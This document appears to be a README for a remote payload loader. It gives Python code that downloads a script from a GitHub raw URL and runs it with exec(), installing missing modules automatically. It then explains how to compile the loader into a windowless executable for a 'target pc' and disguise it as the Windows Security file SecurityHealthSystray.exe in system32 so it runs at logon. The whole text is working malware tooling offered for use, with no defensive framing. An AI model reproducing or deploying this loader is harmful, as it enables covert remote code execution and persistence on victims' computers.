# Client example
```python
import os
import sys
import time
import requests
import subprocess

def has_internet():
    try:
        response = requests.get("https://raw.githubusercontent.com/slayy2357/payload1/main/temp.py")
        if response.status_code == 200 and "#don't delete" in response.text:
            return True, response.text
        else:
            return False, None
    except Exception as e:
        print(f"Error checking internet: {e}")
        return False, None

def execute_a_py(script_content):
    try:
        exec(script_content, globals())
    except Exception as e:
        if isinstance(e, ModuleNotFoundError):
            module_name = str(e).split("'")[1]
            print(module_name)
            install_module(module_name)
        else:
            print(f"Error executing downloaded script: {e}")
            raise

def install_module(module_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
    except subprocess.CalledProcessError as e:
        print(f"Error installing module {module_name}: {e}")
        raise

connected, a_py_content = has_internet()

if connected:
    print("Downloading payload successful.")
    try:
        execute_a_py(a_py_content)
    except Exception as e:
        print(f"Error during execution: {e}")
else:
    print("Failed to download payload or invalid content.")
```
## How to make client autorun
### If you are on windows (and target pc is on windows)
Install requests (and all your client.py dependencies):
```bash
pip install requests
```
Install pyinstaller :
```bash
pip install pyinstaller
```
Compile client to executable :
```bash
pyinstaller client.py --onefile --noconsole --hidden-import=ctypes --hidden-import=ctypes.wintypes
```
### If you are on linux (and target pc is on windows)
Install wine, download python 64bit .exe installer then start cmd :
```bash
wine cmd
```
Install python (replace with real name):
```bash
pythoninstaller.exe
```
Install requests (and all your client.py dependencies):
```bash
pip install requests
```
Then install pyinstaller :
```bash
pip install pyinstaller
```
And finally, compile to .exe :
```bash
pyinstaller client.py --onefile --noconsole --hidden-import=ctypes --hidden-import=ctypes.wintypes
```
## Finally :
Now whether you are on Linux or Windows, you have your client in ```dist/*.exe```, it can be injected as ```SecurityHealthSystray.exe``` for autorun on user logon (```C:\Windows\system32\SecurityHealthSystray.exe```)